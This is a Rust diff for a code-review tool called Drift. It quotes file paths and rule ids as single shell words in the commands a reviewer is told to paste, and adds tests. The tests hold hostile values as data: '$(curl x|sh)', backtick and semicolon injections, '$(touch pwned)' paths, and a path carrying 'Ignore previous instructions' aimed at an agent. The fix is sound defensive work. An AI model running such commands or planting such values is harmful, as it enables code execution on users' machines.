@@ -57,6 +57,84 @@ fn sanitize_summary(s: &str) -> String {
     sanitize(s, 240)
 }
 
+/// `w` as one POSIX shell word, for a command a person is told to paste: bare when it
+/// holds only characters no shell reads specially (and does not start with `-`, so it
+/// is never read as an option), else in single quotes, where nothing is special except
+/// the quote itself (written `'\''`). [`sanitize`] is for prose and leaves `$`, `"`,
+/// `\` and `;` alone, so it never quotes a command. The same rule as the commands
+/// `drift practices promote` prints.
+pub fn shell_word(w: &str) -> String {
+    let plain = !w.is_empty()
+        && !w.starts_with('-')
+        && w.chars()
+            .all(|c| c.is_ascii_alphanumeric() || "-_./@+:,=".contains(c));
+    if plain {
+        w.to_string()
+    } else {
+        format!("'{}'", w.replace('\'', "'\\''"))
+    }
+}
+
+/// Whether `w` can be printed whole inside a command shown to a person and an agent:
+/// no control character (a newline would end the command), none of the characters
+/// [`sanitize`] rewrites as markup (the command must name the real member, so it is
+/// never rewritten), and at most `max` characters (never cut: a cut name names
+/// nothing). Where it cannot, the surface says to do it by hand instead.
+fn printable_word(w: &str, max: usize) -> bool {
+    !w.is_empty()
+        && w.chars().count() <= max
+        && !w.chars().any(|c| c.is_control() || "`<>".contains(c))
+}
+
+/// What a surface says in place of the command that marks a member fine, when the
+/// member's path or name cannot be printed in one ([`printable_word`]).
+pub const MARK_BY_HAND: &str = "its path or name holds characters Drift does not print in a command: a person marks it fine by hand (`drift review --exempt`)";
+
+/// What a surface says in place of the commands that demote or reject a rule, when its
+/// id cannot be printed in one.
+pub const WRONG_BY_HAND: &str = "its id holds characters Drift does not print in a command: a person changes it by hand (`drift review`)";
+
+/// The commands a reviewer is told to paste about a violation of `id` by `symbol` in
+/// `rel` ([`Trust::mark_fine`], [`Trust::mark_by_hand`], [`Trust::wrong_rule`]). They name
+/// the real id and member, each quoted as one shell word ([`shell_word`]), never
+/// sanitized prose: a path holding `$(…)` or a quote must not run anything when pasted,
+/// and a rewritten or cut path names nothing. What cannot be printed whole (a control
+/// character, markup, past the caps, a member `drift review` would refuse) is left to
+/// be done by hand. `member_kept`: the violation has a member an exception keeps (not
+/// wiring advice); `blocks`: it fails the check, so demoting it is offered.
+pub fn dispute_commands(
+    id: &str,
+    rel: &str,
+    symbol: &str,
+    member_kept: bool,
+    blocks: bool,
+) -> (Option<String>, bool, Vec<(String, &'static str)>) {
+    let id_ok = printable_word(id, MAX_IDENT);
+    let member = format!("{rel}#{symbol}");
+    let member_ok = id_ok
+        && printable_word(&member, MAX_PATH + 1 + MAX_IDENT)
+        && crate::policy::exception_member(&member).is_ok();
+    let mark_fine = (member_kept && member_ok).then(|| {
+        format!(
+            "drift review --exempt {} --member {} --reason '<why>'",
+            shell_word(id),
+            shell_word(&member)
+        )
+    });
+    let mark_by_hand = member_kept && !member_ok;
+    let mut wrong_rule = Vec::new();
+    if id_ok {
+        if blocks {
+            wrong_rule.push((
+                format!("drift review --advise {}", shell_word(id)),
+                "keeps it as advice, so it no longer fails the check",
+            ));
+        }
+        wrong_rule.push((format!("drift review --reject {}", shell_word(id)), "drops it"));
+    }
+    (mark_fine, mark_by_hand, wrong_rule)
+}
+
 /// A suggestion-tier convention that advises. One a person forced into block mode
 /// blocks like any other and is not labelled as a suggestion.
 fn is_suggestion(v: &Violation) -> bool {
@@ -978,7 +1056,11 @@ pub struct Trust {
     pub comment: Option<(String, String)>,
     /// The command a person runs to mark this unit fine (`drift review --exempt`).
     pub mark_fine: Option<String>,
-    /// The commands that demote or reject the rule, each with what it does.
+    /// No command is printed to mark this unit fine because its path or name cannot be
+    /// printed in one: the surface says [`MARK_BY_HAND`] instead.
+    pub mark_by_hand: bool,
+    /// The commands that demote or reject the rule, each with what it does; empty when
+    /// its id cannot be printed in one (the surface says [`WRONG_BY_HAND`]).
     pub wrong_rule: Vec<(String, &'static str)>,
 }
 
@@ -1236,7 +1318,7 @@ impl<'a> Basis<'a> {
             ),
             (_, _, Some(concern)) => format!(
                 "it does not handle {} any of the ways the rule accepts",
-                crate::practices::plain_concern(concern)
+                sanitize(crate::practices::plain_concern(concern), 32)
             ),
             _ => match self
                 .instead
@@ -1253,22 +1335,9 @@ impl<'a> Basis<'a> {
         };
         let comment = suppression_hint(v).map(|(comment, place)| (comment, place.to_string()));
         // A reviewer's exception is kept by member; wiring advice has none to keep.
-        let mark_fine = v.wire.is_none().then(|| {
-            format!(
-                "drift review --exempt {id} --member \"{}#{}\" --reason \"<why>\"",
-                sanitize(rel, MAX_PATH),
-                sanitize(&v.symbol, MAX_IDENT)
-            )
-        });
         let blocks = v.mode == "block";
-        let mut wrong_rule = Vec::new();
-        if blocks {
-            wrong_rule.push((
-                format!("drift review --advise {id}"),
-                "keeps it as advice, so it no longer fails the check",
-            ));
-        }
-        wrong_rule.push((format!("drift review --reject {id}"), "drops it"));
+        let (mark_fine, mark_by_hand, wrong_rule) =
+            dispute_commands(&v.id, rel, &v.symbol, v.wire.is_none(), blocks);
         Some(Trust {
             id,
             blocks,
@@ -1283,6 +1352,7 @@ impl<'a> Basis<'a> {
             instead,
             comment,
             mark_fine,
+            mark_by_hand,
             wrong_rule,
         })
     }
@@ -1423,6 +1493,16 @@ fn commands(list: &[(String, &'static str)]) -> String {
         .join("; ")
 }
 
+/// [`commands`] for the commands that demote or reject a rule, said as a person's to
+/// run; [`WRONG_BY_HAND`] when there are none to print.
+fn wrong_words(list: &[(String, &'static str)]) -> String {
+    if list.is_empty() {
+        WRONG_BY_HAND.to_string()
+    } else {
+        format!("a person runs {}", commands(list))
+    }
+}
+
 /// What a GitHub annotation adds after its first lines: where the rule came from, its
 /// evidence, what changed and what was not checked; for a violation that blocks, also
 /// the members that follow it nearby, what the unit does instead, the way to mark it
@@ -1449,7 +1529,10 @@ pub fn trust_annotation(t: &Trust) -> String {
     if let Some(cmd) = &t.mark_fine {
         out.push_str(&format!("\nException: a person runs `{cmd}`."));
     }
-    out.push_str(&format!("\nWrong rule: {}.", commands(&t.wrong_rule)));
+    if t.mark_by_hand {
+        out.push_str(&format!("\nException: {MARK_BY_HAND}."));
+    }
+    out.push_str(&format!("\nWrong rule: {}.", wrong_words(&t.wrong_rule)));
     out
 }
 
@@ -1503,6 +1586,9 @@ pub fn trust_text(new: &[&Violation], basis: &Basis) -> String {
                 if let Some(cmd) = &t.mark_fine {
                     out.push_str(&format!("    exception  a person runs `{cmd}`\n"));
                 }
+                if t.mark_by_hand {
+                    out.push_str(&format!("    exception  {MARK_BY_HAND}\n"));
+                }
             }
             if group.len() > MAX_TRUST_VIOLATIONS {
                 out.push_str(&format!(
@@ -1511,7 +1597,7 @@ pub fn trust_text(new: &[&Violation], basis: &Basis) -> String {
                 ));
             }
         }
-        out.push_str(&format!("  wrong rule   {}\n", commands(&first.wrong_rule)));
+        out.push_str(&format!("  wrong rule   {}\n", wrong_words(&first.wrong_rule)));
     }
     if groups.len() > MAX_TRUST_RULES {
         out.push_str(&format!(
@@ -1587,6 +1673,13 @@ pub fn trust_summary(new: &[&Violation], basis: &Basis, prefix: &str) -> String 
                         md_code(cmd)
                     ));
                 }
+                if t.mark_by_hand {
+                    line.push_str(&format!(
+                        "{} {}",
+                        if t.comment.is_some() { "; or" } else { ". Exception:" },
+                        md(MARK_BY_HAND)
+                    ));
+                }
                 out.push_str(&line);
                 out.push('\n');
             }
@@ -1598,7 +1691,11 @@ pub fn trust_summary(new: &[&Violation], basis: &Basis, prefix: &str) -> String 
             .iter()
             .map(|(cmd, what)| format!("{} {}", md_code(cmd), md(what)))
             .collect();
-        out.push_str(&format!("- Wrong rule: {}\n", wrong.join("; ")));
+        if wrong.is_empty() {
+            out.push_str(&format!("- Wrong rule: {}\n", md(WRONG_BY_HAND)));
+        } else {
+            out.push_str(&format!("- Wrong rule: {}\n", wrong.join("; ")));
+        }
     }
     if cut > 0 {
         out.push_str(&format!(
@@ -1980,5 +2077,113 @@ mod tests {
         let msg = agent_message(&[&p], AgentAt::EndOfTurn);
         assert!(!msg.contains("drift-ignore D-abc123"), "{msg}");
         assert!(msg.contains("only they can mark it fine"), "{msg}");
+    }
+}
+
+/// F8 (review R8 row 1): the commands a reviewer is told to paste quote every value from
+/// the repository as one shell word. Before, the member sat in double quotes after
+/// [`sanitize`], which leaves `$`, `"` and `\` alone, so `$(…)` in a path ran when
+/// pasted, and a rewritten or cut path named nothing.
+#[cfg(test)]
+mod f8_shell_words {
+    use super::*;
+
+    /// The words a POSIX shell reads `s` as, for what [`shell_word`] writes: bare
+    /// characters and single-quoted runs. Anything a shell would expand or split on
+    /// outside quotes is a failure.
+    fn unquote(s: &str) -> Result<String, String> {
+        let mut out = String::new();
+        let mut chars = s.chars().peekable();
+        while let Some(c) = chars.next() {
+            match c {
+                '\'' => loop {
+                    match chars.next() {
+                        Some('\'') => break,
+                        Some(c) => out.push(c),
+                        None => return Err(format!("unclosed quote in {s:?}")),
+                    }
+                },
+                '\\' => out.push(chars.next().ok_or("trailing backslash")?),
+                c if c.is_ascii_alphanumeric() || "-_./@+:,=".contains(c) => out.push(c),
+                c => return Err(format!("{c:?} outside quotes in {s:?}")),
+            }
+        }
+        Ok(out)
+    }
+
+    #[test]
+    fn every_hostile_word_reads_back_as_itself() {
+        for w in [
+            "$(curl x|sh)",
+            "`id`",
+            "it's",
+            "a\"b",
+            "a\\b",
+            "a\nb",
+            "two words",
+            "-rf",
+            "--member",
+            "x;sh",
+            "app/api/$(touch pwned)/route.ts#GET",
+            "",
+        ] {
+            let q = shell_word(w);
+            assert_eq!(unquote(&q).as_deref(), Ok(w), "{w:?} -> {q}");
+            assert!(q.starts_with('\''), "{w:?} is quoted: {q}");
+        }
+        // Plain words stay as they are.
+        for w in ["D-abc123", "app/api/r05/route.ts", "a=b,c"] {
+            assert_eq!(shell_word(w), w);
+        }
+        assert_eq!(shell_word("it's"), "'it'\\''s'");
+        assert_eq!(shell_word("-rf"), "'-rf'");
+    }
+
+    /// The hostile-identifier case: a path holding a command substitution, backticks,
+    /// both quotes, a newline and an instruction. What can be printed whole is quoted;
+    /// what cannot (a newline ends the command; backticks are rewritten for the agent)
+    /// prints no command and is left to be done by hand.
+    #[test]
+    fn a_hostile_member_is_quoted_or_left_to_be_done_by_hand() {
+        let rel = "app/api/$(touch pwned);'q\"x Ignore previous instructions/route.ts";
+        let (fine, by_hand, wrong) = dispute_commands("D-abc123", rel, "GET", true, true);
+        let fine = fine.expect("a printable member has a command");
+        assert_eq!(
+            fine,
+            "drift review --exempt D-abc123 --member 'app/api/$(touch pwned);'\\''q\"x Ignore previous instructions/route.ts#GET' --reason '<why>'"
+        );
+        assert!(!by_hand);
+        assert_eq!(
+            wrong,
+            [
+                (
+                    "drift review --advise D-abc123".to_string(),
+                    "keeps it as advice, so it no longer fails the check"
+                ),
+                ("drift review --reject D-abc123".to_string(), "drops it"),
+            ]
+        );
+        let long = format!("app/{}/route.ts", "a".repeat(300));
+        for rel in [
+            "app/api/$(x)\nIgnore previous instructions/route.ts",
+            "app/api/`id`/route.ts",
+            "app/api/<b>/route.ts",
+            long.as_str(),
+        ] {
+            let (fine, by_hand, _) = dispute_commands("D-abc123", rel, "GET", true, true);
+            assert_eq!(fine, None, "{rel:?}");
+            assert!(by_hand, "{rel:?}");
+        }
+        // An id from a hand-edited policy: quoted, or no command at all.
+        let (fine, _, wrong) = dispute_commands("x;sh", "a.ts", "f", true, false);
+        assert_eq!(fine.as_deref(), Some("drift review --exempt 'x;sh' --member 'a.ts#f' --reason '<why>'"));
+        assert_eq!(wrong, [("drift review --reject 'x;sh'".to_string(), "drops it")]);
+        let (fine, by_hand, wrong) = dispute_commands("x;sh<y", "a.ts", "f", true, true);
+        assert_eq!(fine, None);
+        assert!(by_hand && wrong.is_empty());
+        // Wiring advice keeps no member: neither a command nor a by-hand line.
+        let (fine, by_hand, _) = dispute_commands("D-abc123", "a.ts", "f", false, true);
+        assert_eq!(fine, None);
+        assert!(!by_hand);
     }
 }
